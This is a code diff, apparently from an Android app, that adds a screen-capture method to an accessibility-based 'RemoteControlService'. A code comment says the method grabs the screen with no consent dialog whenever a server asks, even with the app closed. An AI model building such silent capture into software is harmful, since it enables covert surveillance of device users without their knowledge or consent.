@@ -25,6 +25,7 @@ class RemoteControlService : AccessibilityService() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val mainHandler = Handler(Looper.getMainLooper())
+    private val screenshotExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()
     private val gestureQueue = ConcurrentLinkedQueue<GestureDescription>()
     private var isProcessingGestures = false
 
@@ -205,6 +206,45 @@ class RemoteControlService : AccessibilityService() {
     fun getWindowHierarchy(): String? {
         val root = rootInActiveWindow ?: return null
         return buildNodeInfo(root, 0)
+    }
+
+    /**
+     * Blocking screen capture as JPEG bytes via takeScreenshot() (API 30+).
+     * No consent dialog — works whenever the server wants, with the app
+     * closed. Returns null on failure or 5s timeout.
+     */
+    fun capture(): ByteArray? {
+        val latch = java.util.concurrent.CountDownLatch(1)
+        var result: ByteArray? = null
+        val callback = object : AccessibilityService.TakeScreenshotCallback {
+            override fun onSuccess(screenshot: AccessibilityService.ScreenshotResult) {
+                try {
+                    val bmp = android.graphics.Bitmap.wrapHardwareBuffer(
+                        screenshot.hardwareBuffer, screenshot.colorSpace
+                    )
+                    if (bmp != null) {
+                        val out = java.io.ByteArrayOutputStream()
+                        bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, out)
+                        result = out.toByteArray()
+                    }
+                } catch (_: Exception) { }
+                finally {
+                    try { screenshot.hardwareBuffer.close() } catch (_: Exception) { }
+                }
+                latch.countDown()
+            }
+
+            override fun onFailure(errorCode: Int) {
+                latch.countDown()
+            }
+        }
+        try {
+            takeScreenshot(android.view.Display.DEFAULT_DISPLAY, screenshotExecutor, callback)
+        } catch (e: Exception) {
+            return null
+        }
+        latch.await(5, java.util.concurrent.TimeUnit.SECONDS)
+        return result
     }
 
     private fun buildNodeInfo(node: AccessibilityNodeInfo, depth: Int): String {
